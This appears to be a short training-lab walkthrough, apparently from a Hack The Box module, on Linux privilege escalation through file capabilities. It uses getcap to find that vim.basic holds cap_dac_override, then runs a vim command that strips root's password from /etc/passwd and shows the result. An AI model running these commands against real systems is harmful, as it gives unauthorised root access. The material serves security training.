# Capabilities

## Enumeration

```sh
htb-student@ubuntu:~$ find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \; 2> /dev/null
```

```output title="Output" hl_lines="4"
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/bin/ping = cap_net_raw+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/vim.basic = cap_dac_override+eip
```

## File Contents

```sh
htb-student@ubuntu:~$ grep root /etc/passwd
```

```linuxconfig title="Output"
root:x:0:0:root:/root:/bin/bash
```

## Removing Password

```sh
htb-student@ubuntu:~$ echo -e ':%s/^root:[^:]*:/root::/\nwq!' | /usr/bin/vim.basic -es /etc/passwd
```

## File Contents Changed

```sh
htb-student@ubuntu:~$ grep root /etc/passwd
```

```linuxconfig title="Output"
root::0:0:root:/root:/bin/bash
```
